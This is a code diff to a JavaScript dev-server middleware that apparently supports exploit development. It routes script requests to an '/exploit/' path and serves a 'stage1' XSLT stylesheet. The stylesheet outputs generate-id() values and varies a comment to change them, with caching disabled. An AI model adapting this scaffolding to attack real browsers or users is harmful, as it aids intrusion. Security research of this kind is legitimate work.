@@ -22,15 +22,20 @@ function customDevEndpoints() {
           if (url === '/script.js') { req.url = '/exploit/script.js' }
           if (url.startsWith('/stage1_xml.py')) {
             stage1Toggle = !stage1Toggle
-            const payload = stage1Toggle ? 'idA' : 'idB'
+            // 模拟页面修改，通过添加不同的注释来让 generate-id() 返回不同的值
+            const comment = stage1Toggle ? '<!-- modified -->' : '<!-- original -->'
             const xsl = '<?xml version="1.0" encoding="utf-8"?>\n'
               + '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n'
               + '  <xsl:output method="xml" omit-xml-declaration="yes" />\n'
               + '  <xsl:template match="/*">\n'
-              + `    <data>${payload}</data>\n`
+              + `    ${comment}\n`
+              + '    <data><xsl:value-of select="generate-id()"/></data>\n'
               + '  </xsl:template>\n'
               + '</xsl:stylesheet>'
             res.setHeader('Content-Type', 'application/xml; charset=utf-8')
+            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate')
+            res.setHeader('Pragma', 'no-cache')
+            res.setHeader('Expires', '0')
             res.end(xsl)
             return
           }
